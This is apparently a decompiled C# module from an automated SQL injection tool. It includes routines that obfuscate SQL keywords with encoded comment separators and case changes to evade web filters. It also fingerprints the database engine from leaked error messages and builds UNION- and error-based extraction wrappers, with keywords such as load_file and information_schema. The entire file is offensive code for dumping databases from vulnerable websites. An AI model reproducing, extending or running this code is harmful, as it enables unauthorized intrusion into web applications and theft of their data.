using System;
using System.Collections.Generic;
using System.Text;
using DataBase;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0
{
	// Token: 0x020000FE RID: 254
	[StandardModule]
	internal sealed class Class54
	{
		// Token: 0x060010F6 RID: 4342 RVA: 0x00073AA0 File Offset: 0x00071CA0
		public static void smethod_0()
		{
			Class54.dictionary_0 = new Dictionary<string, string>();
			foreach (string text in Class54.string_5.Split(new char[]
			{
				';'
			}))
			{
				if (!string.IsNullOrEmpty(text))
				{
					string text2 = "%2f**%2f" + Class23.smethod_22(text);
					text2 = text2.Replace(" ", "%2f**%2f");
					Class54.dictionary_0.Add(text, "%2f**%2f" + text2);
				}
			}
		}

		// Token: 0x060010F7 RID: 4343 RVA: 0x00073B24 File Offset: 0x00071D24
		internal static void smethod_1(ref string string_6)
		{
			string_6 = string_6.Replace("/**//**/", "/**/");
			string_6 = string_6.Replace("++", "+");
			string_6 = string_6.Replace("----", "--");
			string_6 = string_6.Replace("/**/", " ");
			string_6 = string_6.Replace("%2f**%2f", " ");
			string_6 = string_6.Replace("%2f", " ");
			string_6 = string_6.Replace("  ", " ");
			string_6 = string_6.Replace("/%2A%2A/", " ");
			string_6 = string_6.Replace("%0b", " ");
			string_6 = string_6.Replace("+union+all+select+", " union all select ");
			string_6 = string_6.Replace("+select+", " select ");
			string_6 = Class54.smethod_2(string_6, "unhex(", "|4nh3x(");
			string_6 = Class54.smethod_2(string_6, "group_concat(", "|g_r0up_c0nc4t(");
			try
			{
				foreach (KeyValuePair<string, string> keyValuePair in Class54.dictionary_0)
				{
					string_6 = Class54.smethod_2(string_6, keyValuePair.Key, keyValuePair.Value);
				}
			}
			finally
			{
				Dictionary<string, string>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			string_6 = string_6.Replace("d.schema_name", "d.sChEmA_nAmE");
			string_6 = string_6.Replace("t.table_name", "t.tAblE_nAmE");
			string_6 = string_6.Replace("c.column_name", "c.cOlUmN_nAmE");
			string_6 = Class54.smethod_2(string_6, "|4nh3x(", Class54.dictionary_0["unhex("]);
			string_6 = Class54.smethod_2(string_6, "|g_r0up_c0nc4t(", Class54.dictionary_0["group_concat("]);
			string_6 = string_6.Replace("  ", " ");
			string_6 = string_6.Replace(" (", "(");
			string_6 = string_6.Replace("(+", "(");
			string_6 = string_6.Replace(")(", ")+(");
			string_6 = string_6.Replace("++", "+");
			if (!string.IsNullOrEmpty(Class54.string_4))
			{
				string_6 = string_6.Replace(" ", Class54.string_4);
			}
			string_6 = string_6.Trim();
		}

		// Token: 0x060010F8 RID: 4344 RVA: 0x00073D7C File Offset: 0x00071F7C
		private static string smethod_2(string string_6, string string_7, string string_8)
		{
			int length = string_7.Length;
			checked
			{
				int i;
				while (i <= string_6.Length - 1)
				{
					bool flag = false;
					i = string_6.ToLower().IndexOf(string_7.ToLower(), i);
					if (i <= 0)
					{
						break;
					}
					if (string_7.EndsWith("("))
					{
						flag = true;
					}
					else
					{
						string[] array = new string[2];
						if (i + length + 1 >= string_6.Length)
						{
							array[0] = "";
						}
						else
						{
							array[0] = string_6.Substring(i + length, 1);
						}
						array[1] = string_6.Substring(i - 1, 1);
						if ((Operators.CompareString(array[0], "", false) == 0 | Operators.CompareString(array[0], " ", false) == 0 | Operators.CompareString(array[0], ",", false) == 0 | Operators.CompareString(array[0], "=", false) == 0 | Operators.CompareString(array[0], "+", false) == 0 | Operators.CompareString(array[0], ")", false) == 0 | Operators.CompareString(array[0], "(", false) == 0 | Operators.CompareString(array[0], "]", false) == 0 | Operators.CompareString(array[0], "[", false) == 0 | Operators.CompareString(array[0], ".", false) == 0) & (Operators.CompareString(array[1], "", false) == 0 | Operators.CompareString(array[1], " ", false) == 0 | Operators.CompareString(array[1], ",", false) == 0 | Operators.CompareString(array[1], "=", false) == 0 | Operators.CompareString(array[1], "+", false) == 0 | Operators.CompareString(array[1], ")", false) == 0 | Operators.CompareString(array[1], "(", false) == 0 | Operators.CompareString(array[1], "]", false) == 0 | Operators.CompareString(array[1], "[", false) == 0 | Operators.CompareString(array[1], ".", false) == 0))
						{
							flag = true;
						}
					}
					if (flag)
					{
						string_6 = string_6.Remove(i, length);
						string_6 = string_6.Insert(i, string_8);
					}
					i += string_8.Length;
				}
				return string_6;
			}
		}

		// Token: 0x060010F9 RID: 4345 RVA: 0x00073FAC File Offset: 0x000721AC
		public static Types smethod_3(string string_6)
		{
			Types result;
			if (string.IsNullOrEmpty(string_6))
			{
				result = Types.None;
			}
			else
			{
				string_6 = string_6.ToLower();
				bool flag;
				bool flag2;
				if ((flag = true) == string_6.IndexOf("Dork SQL Injection".ToLower()) >= 0 || flag == string_6.IndexOf("SQL Dork".ToLower()) >= 0 || flag == string_6.IndexOf("Dorks".ToLower()) >= 0 || flag == string_6.IndexOf("SQL Injection".ToLower()) >= 0)
				{
					result = Types.None;
				}
				else if ((flag2 = true) == string_6.IndexOf("mysql_num_rows()".ToLower()) >= 0 || flag2 == string_6.IndexOf("mysql_fetch_array()".ToLower()) >= 0 || flag2 == string_6.IndexOf("mysql_result()".ToLower()) >= 0 || flag2 == string_6.IndexOf("mysql_query()".ToLower()) >= 0 || flag2 == string_6.IndexOf("mysql_fetch_assoc()".ToLower()) >= 0 || flag2 == string_6.IndexOf("mysql_numrows()".ToLower()) >= 0 || flag2 == string_6.IndexOf("mysql_fetch_row()".ToLower()) >= 0 || flag2 == string_6.IndexOf("mysql_fetch_object()".ToLower()) >= 0 || flag2 == string_6.IndexOf("JDBC MySQL()".ToLower()) >= 0 || flag2 == string_6.IndexOf("MySQL Driver".ToLower()) >= 0 || flag2 == string_6.IndexOf("MySQL Error".ToLower()) >= 0 || flag2 == string_6.IndexOf("MySQL ODBC".ToLower()) >= 0 || flag2 == string_6.IndexOf("on MySQL result index".ToLower()) >= 0 || flag2 == string_6.IndexOf("supplied argument is not a valid MySQL result resource".ToLower()) >= 0 || flag2 == string_6.IndexOf("MySQL server version for the right syntax to use near".ToLower()) >= 0 || flag2 == string_6.IndexOf("Driver][mysqld".ToLower()) >= 0 || flag2 == (string_6.IndexOf("Duplicate entry".ToLower()) >= 0 && string_6.IndexOf("for key 'PRIMARY'".ToLower()) >= 0))
				{
					result = Types.MySQL_Unknown;
				}
				else if (flag2 == string_6.IndexOf("Microsoft OLE DB Provider for ODBC Drivers error".ToLower()) >= 0 || flag2 == string_6.IndexOf("[Microsoft][ODBC SQL Server Driver][SQL Server]".ToLower()) >= 0 || flag2 == string_6.IndexOf("ODBC Drivers error '80040e14'".ToLower()) >= 0 || flag2 == string_6.IndexOf("ODBC SQL Server Driver".ToLower()) >= 0 || flag2 == string_6.IndexOf("JDBC SQL".ToLower()) >= 0 || flag2 == string_6.IndexOf("Microsoft OLE DB Provider for SQL Server".ToLower()) >= 0 || flag2 == string_6.IndexOf("Unclosed quotation mark".ToLower()) >= 0 || flag2 == string_6.IndexOf("VBScript Runtime".ToLower()) >= 0 || flag2 == string_6.IndexOf("SQLServer JDBC Driver".ToLower()) >= 0)
				{
					result = Types.MSSQL_Unknown;
				}
				else if (flag2 == string_6.IndexOf("ORA-0".ToLower()) >= 0 || flag2 == string_6.IndexOf("ORA-1".ToLower()) >= 0 || flag2 == string_6.IndexOf("Oracle DB2".ToLower()) >= 0 || flag2 == string_6.IndexOf("Oracle Driver".ToLower()) >= 0 || flag2 == string_6.IndexOf("Oracle Error".ToLower()) >= 0 || flag2 == string_6.IndexOf("Oracle ODBC".ToLower()) >= 0 || flag2 == string_6.IndexOf("MM_XSLTransform error".ToLower()) >= 0 || flag2 == string_6.IndexOf("[Macromedia][Oracle JDBC Driver][Oracle]ORA-".ToLower()) >= 0 || flag2 == string_6.IndexOf("ociexecute(): OCIStmtExecute:".ToLower()) >= 0 || flag2 == string_6.IndexOf("ORA-1".ToLower()) >= 0)
				{
					result = Types.Oracle_Unknown;
				}
				else if (flag2 == (string_6.IndexOf("[Microsoft][ODBC Microsoft Access Driver]".ToLower()) >= 0 & string_6.IndexOf("WHERE".ToLower()) <= 0) || flag2 == (string_6.IndexOf("ODBC Microsoft Access Driver".ToLower()) >= 0 & string_6.IndexOf("WHERE".ToLower()) <= 0) || flag2 == string_6.IndexOf("ocifetch(): OCIFetch:".ToLower()) >= 0)
				{
					result = Types.MsAccess;
				}
				else if (flag2 == string_6.IndexOf("Warning: pg_exec() ".ToLower()) >= 0 || flag2 == string_6.IndexOf("function.pg-exec".ToLower()) >= 0 || flag2 == string_6.IndexOf("target_user:target_db:PostgreSQL".ToLower()) >= 0 || flag2 == string_6.IndexOf("PostgreSQL query failed".ToLower()) >= 0 || flag2 == string_6.IndexOf("Supplied argument is not a valid PostgreSQL result".ToLower()) >= 0 || flag2 == string_6.IndexOf("pg_fetch_array()".ToLower()) >= 0 || flag2 == string_6.IndexOf("pg_query()".ToLower()) >= 0 || flag2 == string_6.IndexOf("pg_fetch_assoc()".ToLower()) >= 0 || flag2 == string_6.IndexOf("function.pg-query".ToLower()) >= 0)
				{
					result = Types.PostgreSQL_Unknown;
				}
				else if (flag2 == string_6.IndexOf("com.sybase.jdbc2.jdbc.SybSQLException".ToLower()) >= 0 || flag2 == string_6.IndexOf("SybSQLException".ToLower()) >= 0)
				{
					result = Types.Sybase;
				}
				else if (flag2 == string_6.IndexOf("Error Executing Database Query".ToLower()) >= 0 || flag2 == string_6.IndexOf("ADODB.Command".ToLower()) >= 0 || flag2 == string_6.IndexOf("BOF or EOF".ToLower()) >= 0 || flag2 == string_6.IndexOf("ADODB.Field".ToLower()) >= 0 || flag2 == string_6.IndexOf("sql error".ToLower()) >= 0 || flag2 == string_6.IndexOf("syntax error".ToLower()) >= 0 || flag2 == string_6.IndexOf("OLE DB Provider for ODBC".ToLower()) >= 0 || flag2 == string_6.IndexOf("ADODBCommand".ToLower()) >= 0 || flag2 == string_6.IndexOf("ADODBField".ToLower()) >= 0 || flag2 == string_6.IndexOf("A syntax error has occurred".ToLower()) >= 0 || flag2 == string_6.IndexOf("Custom Error Message".ToLower()) >= 0 || flag2 == string_6.IndexOf("Incorrect syntax near".ToLower()) >= 0 || flag2 == string_6.IndexOf("Error Report".ToLower()) >= 0 || flag2 == string_6.IndexOf("Error converting data type varchar to numeric".ToLower()) >= 0 || flag2 == string_6.IndexOf("Incorrect syntax near".ToLower()) >= 0 || flag2 == string_6.IndexOf("SQL command not properly ended".ToLower()) >= 0 || flag2 == string_6.IndexOf("Types mismatch".ToLower()) >= 0 || flag2 == string_6.IndexOf("invalid query".ToLower()) >= 0 || flag2 == string_6.IndexOf("unexpected end of SQL command".ToLower()) >= 0 || flag2 == string_6.IndexOf("Unclosed quotation mark before the character string".ToLower()) >= 0 || flag2 == string_6.IndexOf("Unterminated string constant".ToLower()) >= 0 || flag2 == string_6.IndexOf("SQLException".ToLower()) >= 0 || flag2 == string_6.IndexOf("DBObject::doQuery".ToLower()) >= 0)
				{
					result = Types.Unknown;
				}
				else
				{
					result = Types.None;
				}
			}
			return result;
		}

		// Token: 0x060010FA RID: 4346 RVA: 0x00074878 File Offset: 0x00072A78
		public static string smethod_4(MySQLCollactions mySQLCollactions_0)
		{
			string result = "";
			switch (mySQLCollactions_0)
			{
			case MySQLCollactions.None:
				result = "#";
				break;
			case MySQLCollactions.UnHex:
				result = "unhex(hex(#))";
				break;
			case MySQLCollactions.Binary:
				result = "binary(#)";
				break;
			case MySQLCollactions.CastAsChar:
				result = "cast(# as char)";
				break;
			case MySQLCollactions.Compress:
				result = "uncompress(compress(#))";
				break;
			case MySQLCollactions.ConvertUtf8:
				result = "convert(# using utf8)";
				break;
			case MySQLCollactions.ConvertLatin1:
				result = "convert(# using latin1)";
				break;
			case MySQLCollactions.Aes_descrypt:
				result = "aes_decrypt(aes_encrypt(#,1),1)";
				break;
			}
			return result;
		}

		// Token: 0x060010FB RID: 4347 RVA: 0x000748F8 File Offset: 0x00072AF8
		public static string smethod_5(Types types_0)
		{
			string result;
			switch (types_0)
			{
			case Types.MySQL_Unknown:
				result = "MySQL";
				break;
			case Types.MySQL_No_Error:
				result = "MySQL Union";
				break;
			case Types.MySQL_With_Error:
				result = "MySQL Error";
				break;
			case Types.MSSQL_Unknown:
				result = "MS SQL";
				break;
			case Types.MSSQL_No_Error:
				result = "MS SQL Union";
				break;
			case Types.MSSQL_With_Error:
				result = "MS SQL Error";
				break;
			case Types.Oracle_Unknown:
				result = "Oracle";
				break;
			case Types.Oracle_No_Error:
				result = "Oracle Union";
				break;
			case Types.Oracle_With_Error:
				result = "Oracle Error";
				break;
			case Types.PostgreSQL_Unknown:
				result = "PostgreSQL";
				break;
			case Types.PostgreSQL_No_Error:
				result = "PostgreSQL Union";
				break;
			case Types.PostgreSQL_With_Error:
				result = "PostgreSQL Error";
				break;
			case Types.MsAccess:
				result = "MS Access";
				break;
			case Types.Sybase:
				result = "Sybase";
				break;
			default:
				result = "Unknown";
				break;
			}
			return result;
		}

		// Token: 0x060010FC RID: 4348 RVA: 0x000749C0 File Offset: 0x00072BC0
		public static Types smethod_6(string string_6)
		{
			uint num = Class55.smethod_0(string_6);
			if (num > 2257895059U)
			{
				if (num > 3393495623U)
				{
					if (num <= 3533499743U)
					{
						if (num != 3449612908U)
						{
							if (num != 3533499743U)
							{
								goto IL_282;
							}
							if (Operators.CompareString(string_6, "MS SQL Unknown", false) != 0)
							{
								goto IL_282;
							}
						}
						else
						{
							if (Operators.CompareString(string_6, "Sybase", false) == 0)
							{
								return Types.Sybase;
							}
							goto IL_282;
						}
					}
					else if (num != 3849275053U)
					{
						if (num != 4101455373U)
						{
							if (num != 4196966397U)
							{
								goto IL_282;
							}
							if (Operators.CompareString(string_6, "MySQL", false) == 0)
							{
								goto IL_25E;
							}
							goto IL_282;
						}
						else if (Operators.CompareString(string_6, "MS SQL", false) != 0)
						{
							goto IL_282;
						}
					}
					else
					{
						if (Operators.CompareString(string_6, "PostgreSQL Error", false) != 0)
						{
							goto IL_282;
						}
						return Types.PostgreSQL_With_Error;
					}
					return Types.MSSQL_Unknown;
				}
				if (num <= 2712581519U)
				{
					if (num != 2642409342U)
					{
						if (num != 2712581519U)
						{
							goto IL_282;
						}
						if (Operators.CompareString(string_6, "MySQL Unknown", false) != 0)
						{
							goto IL_282;
						}
					}
					else
					{
						if (Operators.CompareString(string_6, "MS SQL Union", false) == 0)
						{
							return Types.MSSQL_No_Error;
						}
						goto IL_282;
					}
				}
				else if (num != 3122682809U)
				{
					if (num != 3393495623U)
					{
						goto IL_282;
					}
					if (Operators.CompareString(string_6, "MS SQL Error", false) == 0)
					{
						return Types.MSSQL_With_Error;
					}
					goto IL_282;
				}
				else
				{
					if (Operators.CompareString(string_6, "MS Access", false) == 0)
					{
						return Types.MsAccess;
					}
					goto IL_282;
				}
				IL_25E:
				return Types.MySQL_Unknown;
			}
			if (num <= 564815639U)
			{
				if (num > 66782414U)
				{
					if (num != 254357513U)
					{
						if (num != 564815639U)
						{
							goto IL_282;
						}
						if (Operators.CompareString(string_6, "Oracle", false) != 0)
						{
							goto IL_282;
						}
					}
					else if (Operators.CompareString(string_6, "Oracle Unknown", false) != 0)
					{
						goto IL_282;
					}
					return Types.Oracle_Unknown;
				}
				if (num != 37244055U)
				{
					if (num == 66782414U)
					{
						if (Operators.CompareString(string_6, "MySQL Union", false) == 0)
						{
							return Types.MySQL_No_Error;
						}
					}
				}
				else if (Operators.CompareString(string_6, "MySQL Error", false) == 0)
				{
					return Types.MySQL_With_Error;
				}
			}
			else
			{
				if (num > 1692667312U)
				{
					if (num != 1828015845U)
					{
						if (num != 1980319588U)
						{
							if (num != 2257895059U)
							{
								goto IL_282;
							}
							if (Operators.CompareString(string_6, "PostgreSQL", false) != 0)
							{
								goto IL_282;
							}
						}
						else
						{
							if (Operators.CompareString(string_6, "Oracle Union", false) == 0)
							{
								return Types.Oracle_No_Error;
							}
							goto IL_282;
						}
					}
					else if (Operators.CompareString(string_6, "PostgreSQL Unknown", false) != 0)
					{
						goto IL_282;
					}
					return Types.PostgreSQL_Unknown;
				}
				if (num != 1355770817U)
				{
					if (num == 1692667312U)
					{
						if (Operators.CompareString(string_6, "PostgreSQL Union", false) == 0)
						{
							return Types.PostgreSQL_No_Error;
						}
					}
				}
				else if (Operators.CompareString(string_6, "Oracle Error", false) == 0)
				{
					return Types.Oracle_With_Error;
				}
			}
			IL_282:
			return Types.Unknown;
		}

		// Token: 0x060010FD RID: 4349 RVA: 0x00074C58 File Offset: 0x00072E58
		public static string smethod_7(List<string> list_0, bool bool_1 = false, bool bool_2 = false, bool bool_3 = false, bool bool_4 = false)
		{
			Conversions.ToString(Interaction.IIf(bool_4, "convert(# using utf8)", "#"));
			string newValue = Conversions.ToString(Interaction.IIf(bool_1, "unhex(hex(#))", "#"));
			string newValue2 = Conversions.ToString(Interaction.IIf(bool_3, "hex(#)", "#"));
			string newValue3 = Conversions.ToString(Interaction.IIf(bool_2, "cast(# as char)", "#"));
			StringBuilder stringBuilder = new StringBuilder();
			checked
			{
				int num = list_0.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					string text = list_0[i].Replace("#", Conversions.ToString(bool_4));
					text = text.Replace("#", newValue2);
					text = text.Replace("#", newValue);
					text = text.Replace("#", newValue3);
					int num2 = i;
					if (num2 == 0)
					{
						stringBuilder.Append(text);
					}
					else if (num2 == list_0.Count - 1)
					{
						stringBuilder.Append(text);
					}
					else
					{
						stringBuilder.Append("," + text);
					}
				}
				return stringBuilder.ToString();
			}
		}

		// Token: 0x060010FE RID: 4350 RVA: 0x00074D7C File Offset: 0x00072F7C
		public static string smethod_8(List<string> list_0, bool bool_1, bool bool_2 = false, bool bool_3 = true)
		{
			StringBuilder stringBuilder = new StringBuilder();
			checked
			{
				int num = list_0.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					string text;
					if (bool_1)
					{
						text = Class23.smethod_20(list_0[i]);
					}
					else
					{
						text = Class23.smethod_21(list_0[i], bool_3, "+", "char");
					}
					int num2 = i;
					if (num2 == 0)
					{
						stringBuilder.Append(text);
					}
					else if (num2 == list_0.Count - 1)
					{
						stringBuilder.Append(text);
					}
					else
					{
						stringBuilder.Append("," + text);
					}
				}
				return stringBuilder.ToString();
			}
		}

		// Token: 0x060010FF RID: 4351 RVA: 0x000091A4 File Offset: 0x000073A4
		public static bool smethod_9(Types types_0)
		{
			return types_0 == Types.MySQL_No_Error | types_0 == Types.MySQL_With_Error | types_0 == Types.MySQL_Unknown;
		}

		// Token: 0x06001100 RID: 4352 RVA: 0x000091B4 File Offset: 0x000073B4
		public static bool smethod_10(Types types_0)
		{
			return types_0 == Types.MSSQL_No_Error | types_0 == Types.MSSQL_With_Error | types_0 == Types.MSSQL_Unknown;
		}

		// Token: 0x06001101 RID: 4353 RVA: 0x000091C4 File Offset: 0x000073C4
		public static bool smethod_11(Types types_0)
		{
			return types_0 == Types.Oracle_No_Error | types_0 == Types.Oracle_With_Error | types_0 == Types.Oracle_Unknown;
		}

		// Token: 0x06001102 RID: 4354 RVA: 0x000091D6 File Offset: 0x000073D6
		public static bool smethod_12(Types types_0)
		{
			return types_0 == Types.PostgreSQL_No_Error | types_0 == Types.PostgreSQL_With_Error | types_0 == Types.PostgreSQL_Unknown;
		}

		// Token: 0x06001103 RID: 4355 RVA: 0x000091E9 File Offset: 0x000073E9
		public static bool smethod_13(Types types_0)
		{
			return types_0 == Types.MySQL_With_Error | types_0 == Types.MSSQL_With_Error | types_0 == Types.Oracle_With_Error | types_0 == Types.PostgreSQL_With_Error;
		}

		// Token: 0x06001104 RID: 4356 RVA: 0x00009200 File Offset: 0x00007400
		public static bool smethod_14(Types types_0)
		{
			return (((-(((types_0 == Types.MySQL_With_Error) > false) ? 1 : 0)) ? 1 : 0) | 3 | ((-(((types_0 == Types.MSSQL_With_Error) > false) ? 1 : 0)) ? 1 : 0) | 6 | ((-(((types_0 == Types.Oracle_With_Error) > false) ? 1 : 0)) ? 1 : 0) | 9 | ((-(((types_0 == Types.PostgreSQL_With_Error) > false) ? 1 : 0)) ? 1 : 0) | 12) != 0;
		}

		// Token: 0x04000897 RID: 2199
		public static string string_0 = "~";

		// Token: 0x04000898 RID: 2200
		public static string string_1 = Class23.smethod_20(Class54.string_0);

		// Token: 0x04000899 RID: 2201
		public static string string_2 = "|";

		// Token: 0x0400089A RID: 2202
		public static string string_3 = Class23.smethod_20(Class54.string_2);

		// Token: 0x0400089B RID: 2203
		public static string string_4 = "+";

		// Token: 0x0400089C RID: 2204
		public static int int_0;

		// Token: 0x0400089D RID: 2205
		public static bool bool_0;

		// Token: 0x0400089E RID: 2206
		private static string string_5 = "union all;select;distinct;from;where;limit;order by;group by;substring(;concat(;concat_ws(;group_concat(;load_file(;convert(;cast(;hex(;unhex(;user();system_user;version();@@version;database();DB_NAME();mysql;`information_schema`;schemata;schema_name;tables;table_name;table_schema;columns;column_name;column_schema;master;sysdatabases;sysobjects;syscolumns";

		// Token: 0x0400089F RID: 2207
		private static Dictionary<string, string> dictionary_0;
	}
}
